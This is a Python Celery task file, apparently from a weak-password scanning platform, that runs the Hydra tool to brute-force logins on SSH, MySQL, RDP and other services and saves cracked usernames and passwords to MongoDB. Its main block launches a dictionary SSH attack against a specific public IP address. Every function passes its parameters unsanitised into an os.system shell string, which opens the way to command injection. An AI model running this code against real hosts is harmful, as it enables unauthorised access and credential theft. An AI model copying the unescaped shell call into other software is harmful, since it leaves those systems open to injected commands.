#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Time    : 8/5/19 7:30 PM
# @Author  : Archerx
# @Blog    : https://blog.ixuchao.cn
# @File    : tasks.py

'''
爆破脚本
'''

import os
from celery_tasks.main import app
from conf.global_config import HYDRADIC_SMALL, HYDRADIC_LARGE
from utils.mongo_op import MongoDB
import json
from conf.global_config import realjoin
import re
from conf.global_config import DIC_USERNAME_FTP, DIC_USERNAME_IMAP, DIC_USERNAME_MEMCACHED, DIC_USERNAME_MONGODB, DIC_USERNAME_MYSQL, \
    DIC_USERNAME_ORACLE, DIC_USERNAME_POP3, DIC_USERNAME_POSTGRESQL, DIC_USERNAME_RDP,DIC_USERNAME_REDIS, DIC_USERNAME_SMB,DIC_USERNAME_SMTP,\
    DIC_USERNAME_MSSQL,DIC_USERNAME_SSH,DIC_USERNAME_SVN,DIC_USERNAME_TELNET,DIC_USERNAME_TOMCAT,DIC_USERNAME_VNC,DIC_USERNAME_WEBLOGIC,COMMON_USERNAME,USERNAME_DICT


@app.task(bind=True,name='HydraBrute')
def dispatch(self, taskID, username, dict, host, port, service):
    if username == "dict":  #跑username字典
        NameDictBrute(taskID, dict, host, port, service)
    else:
        NameBrute(taskID, username, dict, host, port, service)



def handle_result(taskID, result):
    print("this is the begin")
    x = result.strip('\n').split(' ')
    _result = {
        x[0].strip('[').split(']')[1][1:]: {
            'port': x[0].strip('[').split(']')[0],
            'login': x[6].strip(),
            'password': x[10].strip()
        }
    }
    print(_result)
    x = MongoDB()
    x.add_weak_pass_service(taskID, json.dumps(_result))

def NameBrute(taskID, username, large_or_small, host, port, service):
    '''
    用于username已经确定的情况下
    :param taskID:
    :param username:
    :param large_or_small:
    :param host:
    :param port:
    :param service:
    :return:
    '''
    _ = os.system("hydra -l {} -P {} {} -s  {} {} -I -o x".format(username, HYDRADIC_LARGE if large_or_small == "large" else HYDRADIC_SMALL,
                                                          host, port, service))

    with open('x','r') as f:
        for _ in f:
            if _.startswith('['):
                handle_result(taskID, _)
            print(_)
    os.remove('x')

def NameDictBrute(taskID, large_or_small, host, port, service):
    '''
    用于username和passwd都不确定的情况
    :param taskID:
    :param large_or_small:
    :param host:
    :param port:
    :param service:
    :return:
    '''
    dict_name = 'dic_username_' + service + '.txt'
    username_dict = realjoin(USERNAME_DICT,dict_name)

    _ = os.system("hydra -L {} -P {} {} -s  {} {} -I -o x -f".format(username_dict,
                                                                  HYDRADIC_LARGE if large_or_small == "large" else HYDRADIC_SMALL,
                                                                  host, port, service))
    print(_)
    with open('x', 'r') as f:
        for _ in f:
            if _.startswith('['):
                handle_result(taskID, _)
            print(_)
    os.remove('x')




if __name__ == '__main__':
    # SSHBrute('sa','small','127.0.0.1','1433','mssql')

    dispatch('5d51652fa814d0464ed543b6','dict','small','149.129.60.194','22','ssh')
    # handle_result('5d51652fa814d0464ed543b7',"[22][ssh] host: 127.0.0.1   login: x   password: xuchao")
    # handle_result('5d51652fa814d0464ed543b7',"[22][aaa] host: 127.0.0.1   login: x   password: xuchao")

    # NameBrute('root','small','127.0.0.1','3306','mysql')
    # NameBrute('root','small','127.0.0.1','3389','rdp')
    # 另外还支持 smb pop3 telnet ftp